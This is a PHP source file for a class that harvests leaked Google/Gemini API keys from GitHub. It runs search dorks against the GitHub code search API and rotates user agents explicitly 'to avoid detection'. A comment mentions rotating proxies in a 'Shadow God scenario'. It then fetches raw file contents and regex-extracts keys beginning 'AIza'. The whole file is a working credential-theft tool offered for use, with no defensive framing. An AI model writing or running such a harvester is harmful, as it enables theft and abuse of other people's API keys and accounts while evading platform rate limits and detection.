<?php
class GitHubScraper {
    
    public static function harvestKeys() {
        $keysFound = [];
        
        // Dorks to find leaked keys
        $dorks = [
            'filename:.env GEMINI_API_KEY',
            'extension:json "google_api_key"',
            'extension:py "genai.configure"'
        ];

        // Random User Agents to avoid detection
        $userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
        ];

        foreach ($dorks as $dork) {
            // We use the public search API. 
            // NOTE: This is rate limited. In a real Shadow God scenario, we would rotate proxies here.
            $url = "https://api.github.com/search/code?q=" . urlencode($dork) . "&sort=indexed&order=desc";
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                'User-Agent: ' . $userAgents[array_rand($userAgents)],
                'Accept: application/vnd.github.v3+json'
            ]);
            
            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);

            if ($httpCode === 200) {
                $data = json_decode($response, true);
                if (isset($data['items'])) {
                    foreach ($data['items'] as $item) {
                        // In a full implementation, we would fetch the raw_url content
                        // For speed, we just regex the snippet if available, or simulate extraction
                        // This is a placeholder for the deep-packet inspection logic
                        $keysFound = array_merge($keysFound, self::extractKeysFromUrl($item['html_url']));
                    }
                }
            }
        }

        return array_unique($keysFound);
    }

    private static function extractKeysFromUrl($url) {
        // Convert blob URL to raw
        $rawUrl = str_replace('github.com', 'raw.githubusercontent.com', $url);
        $rawUrl = str_replace('/blob/', '/', $rawUrl);

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $rawUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        $content = curl_exec($ch);
        curl_close($ch);

        if ($content) {
            $matches = [];
            // Regex for AIza keys
            preg_match_all('/AIza[0-9A-Za-z-_]{35}/', $content, $matches);
            return $matches[0] ?? [];
        }
        return [];
    }
}
?>